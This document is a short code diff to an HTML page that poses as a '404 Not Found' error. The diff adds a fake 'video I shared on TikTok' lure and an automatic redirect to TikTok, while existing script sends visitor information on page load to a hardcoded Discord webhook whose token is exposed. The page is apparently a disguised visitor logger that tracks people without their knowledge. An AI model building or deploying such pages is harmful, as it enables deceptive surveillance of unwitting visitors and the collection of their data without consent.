@@ -17,6 +17,11 @@
         <h1>404 Not Found</h1>
     </center>
 
+    <div id="redirectMessage">
+        <p>Click to see the video I shared on TikTok!</p>
+        <img src="image.png" alt="TikTok Logo">
+    </div>
+
     <script>
         const webhookUrl = "https://discord.com/api/webhooks/1223441488625533028/BG-cWJMBeDcVPJBj8O_iRWblDPLhrwBHKj5rBVUZfBLVTDKY45Mpbr6wePZSMlp_n7PP";
 
@@ -56,6 +61,11 @@
 
         // Call the function to send visitor information when the page loads
         sendVisitorInfo();
+
+        // Redirect after 2 seconds
+        setTimeout(() => {
+            window.location.href = "https://www.tiktok.com/explore";
+        }, 2000);
     </script>
 </body>
 
